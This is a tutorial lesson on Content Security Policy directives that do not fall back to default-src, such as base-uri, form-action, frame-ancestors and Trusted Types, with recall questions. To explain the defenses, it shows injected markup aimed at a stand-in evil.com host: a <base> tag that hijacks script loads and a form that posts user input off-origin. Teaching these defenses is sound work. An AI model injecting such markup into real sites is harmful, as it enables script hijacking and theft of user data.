Content Security Policy · Lesson 4

Document, navigation & riders

L3 ended on a warning: default-src 'none' locks down fetches and nothing else. This lesson is the "nothing else", the directives that never consult default-src and so must be set by hand. They're what actually stop clickjacking, form exfiltration, and <base> hijacking, plus the "riders" that live in other specs but travel on the CSP header.

The concept

Three families sit outside the fetch cascade:1

  • Document (base-uri, sandbox): properties of the document itself.
  • Navigation (form-action, frame-ancestors): where the page can send you, and who can embed it.
  • Riders (upgrade-insecure-requests, block-all-mixed-content (deprecated), Trusted Types): defined in separate specs but delivered on the CSP header.

None of them fall back to default-src. Omit one and it's off. That is the theme of this lesson.

The steps

DOCUMENT    base-uri     restrict <base href>         source list, no default-src fallback
            sandbox      apply sandbox restrictions    TOKEN list (allow-scripts…), not sources
NAVIGATION  form-action  where forms may submit        source list, no fallback
            frame-ancestors  who may frame this page    'none'/'self'/host/scheme only · HEADER-ONLY
RIDERS      upgrade-insecure-requests   http → https    valueless · rewrites, doesn't block
            trusted-types / require-trusted-types-for   guard DOM injection sinks

Each closes a hole the fetch directives can't reach. Note two odd ones out: sandbox takes tokens, not a source list, and frame-ancestors works only from the HTTP header.

Step 1 — base-uri: shut the <base> hijack

A <base href> tag changes how every relative URL on the page resolves. If an attacker can inject one, <base href="https://evil.com/">, then your relative <script src="app.js"> now loads from evil.com/app.js, and your script-src 'self' was checked after resolution, so it may well pass. base-uri 'none' (or 'self') forbids the injected tag outright. It's cheap, nothing legitimately needs it, and default-src won't cover it, which is why strict CSP always pins it.1

Step 2 — sandbox: the token-valued odd one

Unlike every directive so far, sandbox takes no source list: it takes the same tokens as the <iframe sandbox> attribute, applied to your own document. Bare sandbox (no tokens) is maximally restrictive: scripts off, forms off, popups off, forced into a unique opaque origin. You then re-enable selectively: sandbox allow-scripts allow-forms allow-same-origin …. Drop allow-same-origin and your own storage and cookies vanish, so reach for it deliberately.

Step 3 — form-action: stop the exfiltration form

Where may a <form> submit? An injection that adds <form action="https://evil.com" method="post"> (or rewrites an existing one) can POST whatever the user types straight off-origin. connect-src doesn't cover form navigation, and default-src doesn't back form-action, so without an explicit form-action 'self', forms can target anywhere.1

Step 4 — frame-ancestors: anti-clickjacking, and the X-Frame-Options successor

This is the inverse of frame-src: frame-src controls who you may frame; frame-ancestors controls who may frame you (via <frame>/<iframe>/<object>/<embed>), the clickjacking defense. It accepts only 'none', 'self', and host/scheme sources; nonces, hashes, and 'unsafe-inline' are meaningless here.2 Two sharp edges:

Edge — it supersedes X-Frame-Options, and it's header-only The CSP2 spec is explicit: "The frame-ancestors directive obsoletes the X-Frame-Options header. If a resource has both policies, the frame-ancestors policy SHOULD be enforced and the X-Frame-Options policy SHOULD be ignored." So in a modern browser, frame-ancestors wins; you keep X-Frame-Options only for ancient clients that don't understand CSP. And frame-ancestors is ignored inside a <meta> tag: it works only as an HTTP response header.3

Step 5 — The riders: upgrade-insecure-requests & Trusted Types

upgrade-insecure-requests is valueless. It rewrites the page's http:// subresource URLs to https:// before the request hits the network. It rewrites rather than blocks, and if the resource isn't on HTTPS the request fails (no HTTP fallback). It does not upgrade cross-origin top-level navigations, and it's no substitute for HSTS. Its deprecated cousin block-all-mixed-content blocked mixed content instead of upgrading it, now obsolete.4

Trusted Types (require-trusted-types-for 'script' + trusted-types <policies>) is the frontier. Instead of gating where code loads from, it gates the DOM sinks that turn strings into code (innerHTML, eval, script.src), requiring a typed, policy-sanitized value rather than a raw string. It targets DOM-based XSS, the class a source allowlist can't see because no network fetch is involved.5

Why this matters

1. This family is where "locked down" is won or lost. A policy with a perfect script-src but no frame-ancestors is clickjackable; no base-uri is script-hijackable; no form-action leaks form data. The strict-CSP recipe (L7) pins object-src 'none'; base-uri 'none'; precisely because these don't inherit from default-src.

2. The odd shapes are interview bait. sandbox takes tokens not sources; frame-ancestors is header-only and supersedes X-Frame-Options; upgrade-insecure-requests is valueless and rewrites-not-blocks. Knowing these specific irregularities is the difference between "I've read the directive list" and "I've used them."

3. Trusted Types signals CSP's direction. Source allowlists answer "where can code come from." Trusted Types answers "can a string become code at all." It's the acknowledgement that DOM-XSS lives inside already-trusted script, beyond the reach of script-src.

Key line "Past the fetch family sit directives default-src never backstops: base-uri (kills <base> hijacking), sandbox (token-valued, like iframe sandbox on your own doc), form-action (submission targets), and frame-ancestors, the anti-clickjacking directive that supersedes X-Frame-Options and works only from the HTTP header. Plus riders from other specs: upgrade-insecure-requests rewrites http→https without blocking, and Trusted Types guards DOM injection sinks."
The trap Shallow: "frame-ancestors and X-Frame-Options do the same thing, set either." Deep: frame-ancestors obsoletes XFO (where both exist a modern browser ignores XFO), is more expressive (multiple origins, schemes), but is header-only, so a <meta> CSP can't clickjack-protect you. And neither falls back to default-src, so "I set default-src 'none'" gives zero framing protection.

Recall — answer out loud before peeking:

① Your policy is default-src 'self'; script-src 'self'. Can attacker-injected markup still redirect your relative script loads off-origin?

show answer

Yes, via an injected <base href="https://evil.com/">. Relative srcs resolve against it, and nothing here restricts <base>. You need base-uri 'none' (or 'self'); default-src does not cover it.

② Both frame-ancestors 'self' and X-Frame-Options: DENY are sent. What does a modern browser do?

show answer

Enforces frame-ancestors 'self' and ignores X-Frame-Options (CSP2: frame-ancestors obsoletes XFO). Result: same-origin framing allowed, cross-origin blocked. XFO is only there for pre-CSP browsers.

③ Does upgrade-insecure-requests block an http:// image, or something else?

show answer

Neither blocks nor allows-as-is: it rewrites the URL to https:// before fetching. If the resource isn't on HTTPS the request fails (no HTTP fallback). Blocking was the deprecated block-all-mixed-content's job.

④ Why can't a source allowlist stop DOM-based XSS, and what addresses it?

show answer

DOM-XSS runs inside already-trusted script writing to sinks like innerHTML (no network fetch to gate), so script-src never sees it. Trusted Types (require-trusted-types-for 'script') guards those sinks by demanding a typed, sanitized value instead of a raw string.

Primary source — read this one MDN, frame-ancestors (the XFO relationship, header-only rule, no default-src fallback) and W3C CSP3 §6.2–6.4 for base-uri/sandbox/form-action. For Trusted Types, the MDN Trusted Types API is the on-ramp.
